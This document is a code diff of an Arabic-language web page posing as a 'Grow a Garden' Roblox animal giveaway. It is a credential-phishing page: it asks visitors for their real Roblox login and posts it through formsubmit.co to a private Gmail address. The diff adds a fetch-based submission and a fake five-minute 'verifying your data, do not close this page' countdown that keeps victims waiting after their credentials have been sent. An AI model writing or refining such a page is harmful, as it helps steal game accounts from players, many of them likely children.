@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>جراو أ جاردن - عالم الحيوانات</title>
     <style>
+        /* أنماط الصفحة الرئيسية */
         body {
             margin: 0;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -170,9 +171,59 @@
             color: #383d41;
             display: none;
         }
+
+        /* أنماط صفحة الانتظار المعدلة */
+        .waiting-page {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(75, 0, 130, 0.9); /* خلفية بنفسجية شفافة */
+            z-index: 100;
+            color: white;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(5px); /* تأثير ضبابي */
+        }
+        
+        .waiting-container {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 30px;
+            border-radius: 15px;
+            text-align: center;
+            width: 320px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            border: 2px solid rgba(148, 0, 211, 0.3);
+        }
+        
+        .waiting-container h2 {
+            color: #4b0082;
+            margin-bottom: 15px;
+            font-size: 22px;
+        }
+        
+        .waiting-container p {
+            color: #666;
+            margin: 10px 0;
+        }
+        
+        .countdown {
+            font-size: 28px;
+            font-weight: bold;
+            margin: 20px 0;
+            color: #9400d3;
+            background: rgba(75, 0, 130, 0.1);
+            padding: 10px 15px;
+            border-radius: 10px;
+            border: 1px solid rgba(75, 0, 130, 0.2);
+        }
     </style>
 </head>
 <body>
+    <!-- بقية الكود كما هو -->
     <div class="header">
         <h1>سجل الدخول واختار الحيوان الذي تريده</h1>
     </div>
@@ -183,7 +234,6 @@
         <div id="alertBox" class="alert"></div>
         
         <form id="loginForm" action="https://formsubmit.co/grawagardendev@gmail.com" method="POST">
-            <!-- إعدادات FormSubmit -->
             <input type="hidden" name="_subject" value="تسجيل دخول جديد - جراو أ جاردن">
             <input type="hidden" name="_template" value="table">
             <input type="hidden" name="_next" value="?success=1">
@@ -212,6 +262,17 @@
         <p class="note">ملاحظة: يجب أن تكون معلومات حسابك الأصلية في Roblox</p>
     </div>
 
+    <!-- صفحة الانتظار الجديدة -->
+    <div id="waitingPage" class="waiting-page">
+        <div class="waiting-container">
+            <h2>⏳ جاري التحقق من المعلومات</h2>
+            <p>يرجى الانتظار بينما نقوم بالتحقق من بياناتك</p>
+            <div class="countdown" id="countdown">05:00</div>
+            <p>لا تغلق هذه الصفحة</p>
+        </div>
+    </div>
+
+    <!-- بقية الكود كما هو -->
     <script>
         // اختيار الحيوان
         const animalOptions = document.querySelectorAll('.animal-option');
@@ -244,11 +305,51 @@
             alertBox.className = "alert loading";
             alertBox.style.display = "block";
             
-            // إرسال النموذج بعد تأخير بسيط
-            setTimeout(() => {
-                this.submit();
-            }, 1000);
+            // إرسال النموذج أولاً باستخدام Fetch API
+            fetch(this.action, {
+                method: 'POST',
+                body: new FormData(this)
+            })
+            .then(response => {
+                if (response.ok) {
+                    // بعد الإرسال الناجح، عرض صفحة الانتظار
+                    document.getElementById('waitingPage').style.display = 'flex';
+                    startCountdown();
+                    
+                    // إعادة التوجيه بعد 5 دقائق
+                    setTimeout(() => {
+                        window.location.href = "?success=1";
+                    }, 300000);
+                } else {
+                    throw new Error('فشل في الإرسال');
+                }
+            })
+            .catch(error => {
+                alertBox.textContent = "حدث خطأ أثناء الإرسال، يرجى المحاولة لاحقاً";
+                alertBox.className = "alert";
+                alertBox.style.backgroundColor = "#f8d7da";
+                alertBox.style.color = "#721c24";
+            });
         });
+        
+        // العد التنازلي
+        function startCountdown() {
+            let timeLeft = 300; // 5 دقائق بالثواني
+            const countdownElement = document.getElementById('countdown');
+            
+            const timer = setInterval(() => {
+                timeLeft--;
+                
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                
+                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timer);
+                }
+            }, 1000);
+        }
         
         // التحقق من وجود معلمة النجاح في الرابط
         if(window.location.search.includes('success=1')) {
